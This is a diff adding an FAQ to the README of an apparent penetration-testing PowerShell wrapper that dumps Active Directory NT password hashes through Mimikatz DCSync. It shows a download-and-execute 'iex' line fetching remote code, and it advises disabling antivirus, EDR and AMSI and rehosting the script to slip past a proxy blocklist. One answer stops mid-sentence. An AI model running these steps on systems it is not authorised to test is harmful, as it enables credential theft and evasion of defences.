@@ -41,3 +41,20 @@ iex(new-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/
 You will be prompted about the target AD domain. Confirm to start the DCSync extraction process of NT password hashes. 
 
 As soon as the script finishes, a new Windows file explorer will open automatically and display the relevant output directories.
+
+## 🔎 FAQ
+
+Q: Why do I have to disable Antivirus/EDR/AMSI?
+A: This PowerShell wrapper script heavily relies on popular tooling such as PowerView, Mimikatz and ADRecon. Those tools are known and flagged by AV vendors to be malicious. If you run this PowerShell script with enabled AV/EDR/AMSI, the script will likely be detected as malicious and blocked from being executed.
+
+Q: Why are there two separate directories?
+A: This PowerShell wrapper script was designed to automate the initial process of extracting NT password hashes in order to conduct password cracking. The script will parse Mimikatz's DCSync output into separate directories to establish some kind of privacy. The `CUSTOMER` folder can remain on the customer side, which contains sensitive information about AD users and the belonging password hashes. The `PTF` folder on the other hand 'only' contains NT password hashes without a reference to the actual AD user account that is linked to this password hash.
+
+Q: On which IT system must this script be run?
+A: This PowerShell wrapper script can be run on any domain-joined computer in the target AD environment. It's also possible to execute it from an unjoined computer system. Just make sure that your IT system can talk to the Domain Controller (DC), uses the proper DNS servers to resolve hostnames and that you spawn a PowerShell terminal in the context of a DCSync privileged AD account (e.g. Domain Administrator).
+
+Q: The computer on which the PowerShell script shall run does not have an Internet connection. How can I run the script?
+A: You can download the GitHub repo locally onto disk. However, AV/EDR must be disabled as the scripts will likely be flagged as malicious. Then proceed by executing the `Local-Invoke-DCSync.ps1` script. It references all necessary third
+
+Q: The computer on which the PowerShell script shall run uses a company proxy that blocks the GitHub domain. How can I run the script?
+A: You can either host the script on a different domain under your control, which is not blacklisted. Or see the above Q&A to run the script locally.
